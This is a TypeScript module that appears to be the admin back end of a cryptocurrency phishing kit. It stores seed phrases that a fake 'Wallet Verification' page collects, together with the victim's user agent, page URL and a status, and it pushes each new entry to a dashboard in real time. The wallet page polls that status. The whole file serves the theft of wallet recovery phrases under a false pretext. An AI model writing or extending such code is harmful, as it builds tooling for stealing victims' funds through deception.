import { Entry, EntryStatus } from '../types';

const ENTRIES_KEY = 'admin_entries';
const COUNTER_KEY = 'admin_entry_counter';

function generateId(): string {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 9);
}

function getNextIndex(): number {
  const current = parseInt(localStorage.getItem(COUNTER_KEY) || '0', 10);
  const next = current + 1;
  localStorage.setItem(COUNTER_KEY, next.toString());
  return next;
}

export function fetchEntries(): Entry[] {
  const raw = localStorage.getItem(ENTRIES_KEY);
  if (!raw) return [];
  try {
    return JSON.parse(raw);
  } catch {
    return [];
  }
}

export function addEntry(data: {
  activity: string;
  ip: string;
  userAgent: string;
  seedPhrase: string;
  referer?: string;
}): Entry {
  const entries = fetchEntries();
  const entry: Entry = {
    id: generateId(),
    index: getNextIndex(),
    activity: data.activity,
    ip: data.ip,
    userAgent: data.userAgent,
    status: 'waiting',
    seedPhrase: data.seedPhrase,
    createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
    referer: data.referer,
  };
  entries.push(entry);
  localStorage.setItem(ENTRIES_KEY, JSON.stringify(entries));

  // Dispatch event so dashboard picks it up in real-time
  window.dispatchEvent(new CustomEvent('new-entry', { detail: entry }));

  return entry;
}

// Called from the wallet page to submit a seed phrase
export function submitFromWallet(seedPhrase: string): { entryId: string } {
  const entry = addEntry({
    activity: 'Wallet Verification',
    ip: 'Client-side',
    userAgent: navigator.userAgent,
    seedPhrase: seedPhrase.trim(),
    referer: window.location.href,
  });
  return { entryId: entry.id };
}

// Get a single entry's status (used by wallet page to poll)
export function getEntryStatus(entryId: string): EntryStatus | null {
  const entries = fetchEntries();
  const entry = entries.find(e => e.id === entryId);
  return entry ? entry.status : null;
}

export function updateEntryStatus(id: string, status: EntryStatus): Entry | null {
  const entries = fetchEntries();
  const index = entries.findIndex(e => e.id === id);
  if (index === -1) return null;
  entries[index].status = status;
  localStorage.setItem(ENTRIES_KEY, JSON.stringify(entries));
  return entries[index];
}

export function deleteEntry(id: string): boolean {
  const entries = fetchEntries();
  const filtered = entries.filter(e => e.id !== id);
  if (filtered.length === entries.length) return false;
  localStorage.setItem(ENTRIES_KEY, JSON.stringify(filtered));
  return true;
}

export function deleteMultipleEntries(ids: string[]): number {
  const entries = fetchEntries();
  const idSet = new Set(ids);
  const filtered = entries.filter(e => !idSet.has(e.id));
  const removed = entries.length - filtered.length;
  localStorage.setItem(ENTRIES_KEY, JSON.stringify(filtered));
  return removed;
}

export function clearAllEntries(): void {
  localStorage.removeItem(ENTRIES_KEY);
  localStorage.removeItem(COUNTER_KEY);
}
